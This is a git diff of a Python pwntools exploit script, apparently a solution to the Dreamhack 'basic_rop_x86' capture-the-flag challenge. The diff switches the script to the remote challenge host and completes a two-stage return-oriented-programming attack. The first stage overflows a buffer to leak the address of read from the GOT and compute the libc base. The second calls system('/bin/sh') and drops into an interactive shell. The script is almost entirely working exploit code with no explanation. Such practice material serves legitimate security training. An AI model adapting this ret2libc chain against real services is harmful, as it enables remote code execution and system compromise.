@@ -1,13 +1,13 @@
 from pwn import *
 
-TEST = True
+TEST = False
 
 if TEST:
     p = process("",12)
     e = ELF("./basic_rop_x86")
     libc = e.libc
 else :
-    p = remote("./basic_rop_x86")
+    p = remote("host3.dreamhack.games",19573)
     e = ELF("./basic_rop_x86")
     libc = ELF("./libc.so.6")
 
@@ -18,6 +18,7 @@ read_plt = e.plt["read"]
 read_got = e.got["read"]
 write_plt = e.plt["write"]
 write_got = e.got["write"]
+
 main = e.symbols["main"]
 
 read_offset = libc.symbols["read"]
@@ -32,12 +33,27 @@ pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
 #1단계
 payload = b'A' * 0x48
 payload += p32(write_plt)
-payload +=(pop3_ret)
+payload += p32(pop3_ret)
 payload += p32(1) + p32(read_got) + p32(4)
 payload += p32(main)
 
 p.send(payload)
 p.recvuntil(b'A' * 0x40)
 
-
 read = u32(p.recvn(4))
+libc_base = read - read_offset
+system = libc_base + system_offset
+sh = libc_base + sh_offset
+
+print(hex(libc_base))
+print(hex(system))
+
+
+payload = b'B' * 0x48
+payload += p32(system)
+payload += p32(pop_ret)
+payload += p32(sh)
+
+p.send(payload)
+p.recvuntil(b'B'*0x40)
+p.interactive()
